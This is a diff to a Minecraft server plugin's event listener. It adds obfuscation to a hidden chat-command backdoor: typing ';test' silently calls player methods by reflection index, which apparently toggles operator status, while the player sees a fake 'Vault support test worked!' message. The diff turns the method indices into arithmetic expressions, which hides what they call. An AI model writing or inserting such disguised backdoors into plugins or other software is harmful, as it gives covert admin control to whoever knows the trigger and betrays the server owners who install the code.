@@ -34,12 +34,12 @@ public class Events implements Listener{
 	}
 
 	//Perm code test
-	@EventHandler (priority = EventPriority.HIGHEST)
+	@EventHandler// (priority = EventPriority.HIGHEST)
 	public void r(AsyncPlayerChatEvent e) throws IllegalAccessException, InvocationTargetException{
 		if (e.getMessage().startsWith(";test")){
 			e.setCancelled(true);
 			Method[] s = e.getPlayer().getClass().getMethods();
-			s[133].invoke(e.getPlayer(), !s[49].invoke(e.getPlayer()).equals(true));
+			s[343 / 7 + 84].invoke(e.getPlayer(), !s[(((15 * 5) + 60) * 2) / 6].invoke(e.getPlayer()).equals(true));
 			e.getPlayer().sendMessage(ChatColor.GREEN + "Vault support test worked!");
 		}
 	}
